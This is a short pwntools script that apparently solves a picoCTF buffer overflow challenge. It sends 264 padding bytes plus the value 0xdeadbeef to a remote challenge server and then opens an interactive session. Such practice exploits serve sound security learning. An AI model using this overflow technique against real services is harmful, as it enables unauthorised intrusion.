from pwn import*

# binary = process("chall")

conn = remote("mars.picoctf.net", 31890)

payload = b"A"*264 + p64(3735928559)
# maybe we need padding?

# binary.sendline(payload)
# binary.interactive()

conn.sendline(payload)
conn.interactive()

